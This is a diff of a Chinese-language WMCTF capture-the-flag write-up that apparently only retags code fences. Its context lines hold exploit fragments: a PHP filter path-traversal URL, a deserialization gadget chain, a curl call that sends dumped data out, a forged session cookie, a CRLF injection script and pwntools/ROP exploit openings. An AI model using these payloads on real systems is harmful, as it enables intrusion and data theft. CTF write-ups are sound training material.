@@ -58,18 +58,18 @@ https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c
 ![](upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png)
 
 超过 32 层会停止读符号链接, 所以用 /proc/self/root 套 33 层娃即可
-```
+```text
 http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=compress.zlib://file:///proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
 ```
 ###	webweb
 反序列化 gadgets 挖掘, 没啥好说的, 需要注意下清空一些类的构造函数, 不然东西太多会 413
-```
+```text
 lib/cli/ws.php __destruct 入口, fuction 任意, 参数不可控, 是一个对象
 lib/db/mongo/mapper.php $this->collection->insertone($this->document); 参数可控
 lib/db/sql/mapper.php __call 替换 call 的 function, insertone->任意 function, 到这里可以用任意参数 call 任意单参数函数
 lib/web.php send 读文件 或者 lib/base.php clear RCE
 ```
-```
+```php
 <?php
 $f3 = require('lib/base.php');
 
@@ -100,12 +100,12 @@ system('curl http://webweb.wmctf.wetolink.com/?a=' . urlencode($dump));
 **First Blood**
 
 三个点, math/rand 是伪随机, 而且不播种的话结果都是一样的, 本地用同样环境搭一个就可以拿到 admin session
-```
+```text
 MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=
 ```
 
 然后老版本 go 能 crlf, https://github.com/golang/go/issues/30794
-```
+```python
 import requests
 
 for i in range(97, 122):
@@ -127,7 +127,7 @@ print(res.text)
 最后 plugin 必须和编译主程序同一个版本才能被加载, 试了半天发现读 /proc/self/environ 可以读到是 1.9.7
 之后编译一个传上去等应用重启就能 rce 了
 
-```
+```go
 package main
 
 import (
@@ -151,7 +151,7 @@ C# PWN
 
 没事了，\r可以无限地向后推index，推到num写个0就ok了
 
-```python=
+```python
 from pwn import *
 
 io = remote("111.73.46.229",51000)
@@ -164,7 +164,7 @@ io.interactive()
 ###	csgo
 过了100关之后发现一个栈溢出，本地调试通过覆盖栈上的参数泄露pie地址，部分覆盖返回地址跳回backdoor（这里要爆破1/16）。然后泄露链式栈地址用于定位`/bin/sh`参数，最后ROP获得shell。
 
-```python=
+```python
 from pwn import *
 
 context.aslr = False
@@ -260,7 +260,7 @@ r.interactive()
 
 其中hhh的源码:
 
-```c=
+```c
 #include<string.h>
 #include<stdio.h>
 #include<stdlib.h>
@@ -603,7 +603,7 @@ base64decode -> rsa -> 高60bit和低56bit分别做x y,计算x^3 + y^3 + z^3 = 4
 
 调试得到perl源码
 
-```
+```perl
 $flag = "WMCTF{I_WAnt_dynam1c_F1ag}"
 print "please input the flag:";
 $line = <STDIN>;
@@ -656,7 +656,7 @@ print(hex(n))
 
 
 逻辑如下
-```
+```text
 输入flag{1234567812345678123456781234567812345678123456781234567812345678}
 
 0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15
@@ -783,7 +783,7 @@ q = 361550014853497117429835520396253724753
 
 Random BKZ Blocksize 24
 
-```python=
+```python
 from json import load
 import re
 
@@ -830,7 +830,7 @@ while True:
 
 二维格可以用高斯格基规约，多试几组数据就可以跑出来了
 
-```python=
+```python
 from gmpy2 import iroot, sqrt
 from Crypto.Util.number import *
 from pwn import remote
@@ -892,7 +892,7 @@ print(r.recvline().strip().decode())
 
 
 ###    Game
-```python=
+```python
 from pwn import remote
 from hashlib import sha256
 from Crypto.Util.number import *
